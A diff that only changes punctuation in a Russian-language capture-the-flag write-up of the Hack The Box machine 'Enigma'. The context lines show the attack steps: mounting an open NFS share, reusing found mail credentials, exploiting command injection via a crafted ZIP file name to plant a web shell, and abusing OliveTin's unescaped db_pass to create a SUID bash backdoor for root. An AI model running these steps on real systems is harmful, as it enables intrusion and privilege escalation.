@@ -1,4 +1,4 @@
-ENIGMA (HTB) — ATTACK CHAIN
+﻿ENIGMA (HTB) - ATTACK CHAIN
 
 Reconnaissance
 ├── nmap -sC -sV -p- enigma.htb → 22 (SSH, только ключи), 80 (nginx "Enigma Corp")
@@ -55,13 +55,13 @@ Privilege Escalation (OliveTin)
 nmap -sC -sV -p- -oN nmap_full.txt enigma.htb
 ```
 
-**Результат — открытые порты:**
-- `22` — SSH (OpenSSH 9.6, только публичные ключи, пароль отключён)
-- `80` — nginx, статичная визитка "Enigma Corp"
-- `110/143/993/995` — Dovecot (POP3/IMAP) — почтовый сервер
-- `111/2049` + `mountd`/`nlockmgr` — NFS
+**Результат - открытые порты:**
+- `22` - SSH (OpenSSH 9.6, только публичные ключи, пароль отключён)
+- `80` - nginx, статичная визитка "Enigma Corp"
+- `110/143/993/995` - Dovecot (POP3/IMAP) - почтовый сервер
+- `111/2049` + `mountd`/`nlockmgr` - NFS
 
-## 2. Первая точка входа — NFS
+## 2. Первая точка входа - NFS
 
 ```bash
 showmount -e enigma.htb
@@ -69,7 +69,7 @@ showmount -e enigma.htb
 # /srv/nfs/onboarding *
 ```
 
-Шара открыта для всех (`*`, без ограничений) — монтируем:
+Шара открыта для всех (`*`, без ограничений) - монтируем:
 ```bash
 mkdir /tmp/nfs_enigma
 sudo mount -t nfs enigma.htb:/srv/nfs/onboarding /tmp/nfs_enigma -o nolock
@@ -99,7 +99,7 @@ curl -k 'imaps://enigma.htb' --user 'kevin:Enigma2024!'
 curl -k 'imaps://enigma.htb/INBOX' --user 'kevin:Enigma2024!'
 ```
 
-В INBOX находим приветственное письмо от **Sarah** (`sarah@enigma.htb`) — подсказка, что пароль мог переиспользоваться у других сотрудников.
+В INBOX находим приветственное письмо от **Sarah** (`sarah@enigma.htb`) - подсказка, что пароль мог переиспользоваться у других сотрудников.
 
 ## 4. Password reuse → доступ Sarah → ещё одни креды
 
@@ -116,13 +116,13 @@ curl -k 'imaps://enigma.htb/INBOX' --user 'kevin:Enigma2024!'
 Version: 2.9.8
 ```
 
-Находим **CVE-2025-69212** — OS Command Injection через P7M-файлы в плагине импорта электронных счетов (`GHSA-25fp-8w8p-mx36`). Уязвимость в функции `decodeP7M()` — имя файла из ZIP-архива передаётся в `exec()` без экранирования кавычек.
+Находим **CVE-2025-69212** - OS Command Injection через P7M-файлы в плагине импорта электронных счетов (`GHSA-25fp-8w8p-mx36`). Уязвимость в функции `decodeP7M()` - имя файла из ZIP-архива передаётся в `exec()` без экранирования кавычек.
 
 ## 6. Эксплуатация RCE через ZIP с вредоносным именем файла
 
 Собираем ZIP-архив, где имя файла внутри содержит command injection payload (через `zipfile` в Python), загружаем через раздел **Sales → Sales invoices → Importazione FE**.
 
-После загрузки — ошибка XML-парсинга (`Start tag expected, '<' not found`) означает, что команда уже выполнилась до падения парсера. Подтверждаем RCE:
+После загрузки - ошибка XML-парсинга (`Start tag expected, '<' not found`) означает, что команда уже выполнилась до падения парсера. Подтверждаем RCE:
 ```bash
 curl "http://support_001.enigma.htb/files/SHELL.php?c=id"
 # uid=33(www-data) gid=33(www-data) groups=33(www-data)
@@ -184,12 +184,12 @@ su haris
 cat ~/user.txt
 ```
 
-## 12. Enumeration для privesc — находим OliveTin
+## 12. Enumeration для privesc - находим OliveTin
 
 ```bash
 ps aux | grep root
 ```
-Видим `/usr/local/bin/OliveTin` — работает от root, веб-интерфейс автоматизации на `127.0.0.1:1337`.
+Видим `/usr/local/bin/OliveTin` - работает от root, веб-интерфейс автоматизации на `127.0.0.1:1337`.
 
 ```bash
 cat /etc/OliveTin/config.yaml
@@ -202,7 +202,7 @@ cat /etc/OliveTin/config.yaml
   shell: "mysqldump -u {{ db_user }} -p'{{ db_pass }}' {{ db_name }} > /opt/backups/backup.sql"
 ```
 
-Параметр `db_pass` подставляется в shell без экранирования одинарных кавычек — классическая command injection.
+Параметр `db_pass` подставляется в shell без экранирования одинарных кавычек - классическая command injection.
 
 ## 13. Изучение API OliveTin
 
@@ -217,7 +217,7 @@ curl -X POST "http://127.0.0.1:1337/api/StartAction" -H "Content-Type: applicati
 ```
 Ошибка в логах (`cannot create /opt/backups/backup.sql: Directory nonexistent`) подтверждает, что `mysqldump` реально выполнился.
 
-## 14. Эксплуатация — SUID bash через command injection
+## 14. Эксплуатация - SUID bash через command injection
 
 ```bash
 cat > /tmp/backdoor.json <<'JSON'
@@ -246,14 +246,14 @@ whoami   # root
 cat /root/root.txt   # <ROOT_FLAG>
 ```
 
-Флаг `-p` у bash важен — он не даёт bash сбросить эффективный UID обратно до реального при запуске SUID-копии.
+Флаг `-p` у bash важен - он не даёт bash сбросить эффективный UID обратно до реального при запуске SUID-копии.
 
 ---
 
 ## Ключевые уроки машины
 
-1. **NFS без ограничений** — частая точка входа, всегда проверяй `showmount -e`.
-2. **Password reuse** — временные пароли сотрудники редко меняют, пробуй один пароль на разных юзернеймах.
-3. **CVE-хантинг по версии ПО** — определи версию → ищи конкретный advisory, а не слепой брутфорс эксплойтов.
-4. **Command injection через шаблонизацию** — везде, где пользовательский ввод подставляется в shell-команду через `{{ }}`-синтаксис без санитизации, ищи способ вырваться из кавычек.
-5. **Привилегированные локальные сервисы** (как OliveTin на 127.0.0.1) — классический вектор privesc, если в них есть доступная конфигурация с похожими уязвимостями.
+1. **NFS без ограничений** - частая точка входа, всегда проверяй `showmount -e`.
+2. **Password reuse** - временные пароли сотрудники редко меняют, пробуй один пароль на разных юзернеймах.
+3. **CVE-хантинг по версии ПО** - определи версию → ищи конкретный advisory, а не слепой брутфорс эксплойтов.
+4. **Command injection через шаблонизацию** - везде, где пользовательский ввод подставляется в shell-команду через `{{ }}`-синтаксис без санитизации, ищи способ вырваться из кавычек.
+5. **Привилегированные локальные сервисы** (как OliveTin на 127.0.0.1) - классический вектор privesc, если в них есть доступная конфигурация с похожими уязвимостями.
